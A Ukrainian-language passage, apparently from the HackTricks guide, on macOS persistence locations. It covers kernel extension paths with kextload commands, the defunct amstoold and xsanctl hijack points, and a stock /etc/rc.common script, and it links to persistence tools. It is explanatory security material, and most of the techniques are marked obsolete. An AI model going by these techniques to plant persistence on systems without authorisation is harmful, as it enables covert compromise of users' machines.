XQuartz **більше не встановлений в macOS**, тому якщо ви хочете більше інформації, перегляньте звіт.

### ~~kext~~

> [!CAUTION]
> Встановити kext навіть як root настільки складно, що я не розглядатиму це як спосіб втечі з пісочниць або навіть для постійності (якщо у вас немає експлуатації)

#### Location

Щоб встановити KEXT як елемент автозавантаження, його потрібно **встановити в одне з наступних місць**:

- `/System/Library/Extensions`
- Файли KEXT, вбудовані в операційну систему OS X.
- `/Library/Extensions`
- Файли KEXT, встановлені стороннім програмним забезпеченням

Ви можете перерахувати в даний момент завантажені файли kext за допомогою:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Для отримання додаткової інформації про [**розширення ядра перевірте цей розділ**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Запис: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Локація

- **`/usr/local/bin/amstoold`**
- Потрібен root

#### Опис та експлуатація

Очевидно, що `plist` з `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей бінарний файл, відкриваючи XPC сервіс... справа в тому, що бінарний файл не існував, тому ви могли розмістити щось там, і коли XPC сервіс буде викликано, ваш бінарний файл буде викликано.

Я більше не можу знайти це у своєму macOS.

### ~~xsanctl~~

Запис: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Локація

- **`/Library/Preferences/Xsan/.xsanrc`**
- Потрібен root
- **Тригер**: Коли сервіс запускається (рідко)

#### Опис та експлуатація

Очевидно, що цей скрипт не дуже часто запускається, і я навіть не зміг знайти його у своєму macOS, тому якщо ви хочете більше інформації, перевірте запис.

### ~~/etc/rc.common~~

> [!CAUTION] > **Це не працює в сучасних версіях MacOS**

Також можливо розмістити тут **команди, які будуть виконані під час запуску.** Приклад звичайного скрипту rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Техніки та інструменти постійності

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
